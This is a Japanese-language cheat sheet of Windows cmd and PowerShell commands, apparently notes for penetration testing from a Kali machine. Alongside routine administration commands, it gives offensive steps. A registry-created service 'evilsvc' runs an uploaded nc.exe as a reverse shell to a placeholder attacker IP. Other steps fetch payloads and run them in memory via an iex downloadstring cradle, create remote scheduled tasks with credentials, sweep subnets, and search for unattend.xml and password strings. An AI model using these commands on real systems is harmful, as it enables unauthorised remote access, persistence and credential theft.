# windows command

## cmd

* net XXX

``` bat
    # ユーザ情報
    net user
    または
    wmic USERACCOUNT Get Domain,Name,Sid
    # ログオンとかパスワード条件とか
    net accounts
    # ローカルグループ情報
    net localgroup
```

* tasklist

``` bat
    tasklist /SVC
    
    tasklist /m
```

* schtasks

```bat
    schtasks /?
    schtasks /Create /?
    # /S: 接続先リモートシステム
    # /U: ユーザ名
    # /P: パスワード
    # /TN: タスク名
    # /SC: スケジュール(1回) 
    # /SD: 開始日
    # /ST: 開始時刻
    # /TR: 実行タスク
    # /F: 指定したタスクが既に存在する場合、タスクを強制的に作成し、警告を抑制
    # /RL: ジョブの実行レベルを設定
    
    #タスク作成
    schtasks /Create /S 192.168.xxx.xxx /U <user> /P <password> /TN sample /SC ONCE /SD 1900/01/01 /ST 00:00 /TR C:¥Remote¥test.bat
    # タスク実行
    schtasks /run /tn <タスク名>
    # タスクの削除
    schtasks /delete /f /tn <タスク名>
    # タスクの一覧表示(詳細)
    schtasks /query /fo list /v
```

* システム情報

```bat
    systeminfo
    または
    wmic computersystem LIST full
```

* マウント情報(共有ドライブとか)

``` bat
    mountvol
```

* ドメイン情報

``` bat
    #　ドメコン名とかの取得
    nltest /dsgetdc:<domain>
```

* ping sweep

``` bat
    for /l %i in (1,1,255) do @ping -n 1 -w 100 XXX.XXX.XXX.%i | find "TTL="
```

* ファイル検索

``` bat
    dir /s *<file_name>*  
　  # 検索でよく使うファイルパターン
    *.txt/*.doc/*.xls/*.one/*.cnf/unattend.xml
```

* kaliにあるwindowsで実行可能なファイル
  
    `/usr/share/windows-binaries`

* windows reverse shell
  * windowsサービス

``` bat
    #wordpressから[nc.exe]をfile uploadする必要がある。
    reg add HKLM\SYSTEM\CurrentControlSet\Services\evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c \"C:\inetpub\wwwroot\wordpress\wp-content\themes\twentytwenty\nc.exe XXX.XX.XX.XX PPPP -e cmd\"" /f

    #再起動できる場合は再起動
    shutdown /r /t 0 /f
```

* sc

``` batch
    # サービス登録コマンド
    # notepad.exeをシステム起動時に自動起動するサービスを登録するコマンド 
    sc create notepad binpath= "C:¥Windows¥system32¥notepad.exe" start=auto
    # サービス情報の表示
    sc qc <service_name>
    # サービス起動
    sc start <service_name>
    # サービス停止
    sc stop <service_name>
```

* wmic

``` bat
    #システム情報
    wmic computersystem LIST full
    #サービス検索
    wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\"
    #ファイル検索
    wmic DATAFILE where "drive='C:' AND Name like '%<file_name>%'" GET Name,Readable,size /VALUE
    #プロセス操作
    wmic process call create ‘C:¥Windows¥System32¥notepad.exe‘
```

* whoami

``` bat
    whoami
    #権限表示
    whoami /priv
    #グループ表示
    whoami /group
```

## PowerShell

* サバイバルコマンドレット

``` powershell
    # コマンドの取得
    Get-Command <value>
    Get-Command -noun volume
    # エイリアスの取得
    Get-Alias <value>
    # ヘルプ表示
    Get-Help
    Get-Help  -Example <commandlet>
```

* 自動変数

``` powershell
    #バージョン確認
    $PsVersionTable
    #直前処理の成否
    $?
```

* 環境変数

``` powershell
    $true
    $false
    $null
    $env:<変数名>
```

* 演算子
  
``` powershell
    -eq
    -ne
    -gt
    -ge
    -and
    -or
    -like / -noylike
    -match / -notmatch
    # AをBに置換
    -replace A,B
```

* リダイレクト
  * `>` は　UTF16リトルエンディアンになるため、Linux系では読めなくなる。
  * `>` ではなく `Out-File`を使った方がいい

* ショートカット
  * `-`のあとに何があるか知りたいときは `Ctrl+Space`で一覧表示
  * `Ctrl+Home`で行頭まで削除
  * `Ctrl+End`で行末まで削除

* ファイルダウンロード

``` powershell
    powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://<Remote KaliのIP>:8000/nc.exe" -OutFile "nc.exe")
    
    iwr -Uri http://XXX.XXX.XXX.XXX/<file_name> -OutFile "<file_path>\<file_name>>"
    
    iex(new-object net.webclient).downloadstring('http://XXX.XXX.XXX.XXX/<file_name>')
```

* 共有ドライブ

``` powershell
    powershell -Command "Get-WmiObject -class Win32_Share"
```

* プロセス操作

``` powershell
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ‘C:¥Windows¥System32¥notepad.exe’
```
  
``` powershell
    #一覧取得
    Get-Process
    #特定のプロセスの取得
    Get-Process -Name <process_name>
    #取得情報の選択、書式の指定
    Get-Process <process_name> | Select-Object Id, Path |　Format-List
    #条件の抽出
    # Where-Objectで行の抽出
    # Select-Objectで列の選択
    Get-Process | Where-Object {$_.Path -like "*temp*"} | Select-Object Id, ProcessName, Path
    
```

* システム管理情報
  * Get-Processより使える

``` powershell
    # プロセス情報の取得
    #{}内　Calculated Properties　連想配列でプロパティを定義
    # @{ Name = 'プロパティ名';Expression={ 定義式 }}
    Get-CimInstance -Class Win32_Process -Filter "Name = 'プロセス名'" | Select-Object ProcessId, Name, Path, parentProcessId,@{Name = 'parentProcessName' Expression = {(Get-Process -Id $_.parentProcessId).Name }} | Select-Object -First 1 | Format-List

    # {}は必要時まで処理の保留　無名関数のように使用できる。
    # ()はすぐに評価して処理を返す
```

* テキスト検索

``` powershell
    #-path 検索ファイルのパス
    #-pattern 検索するテキスト
    #passwordを含むテキスト検索
    Select-String -path .\*\*\* -pattern password
```
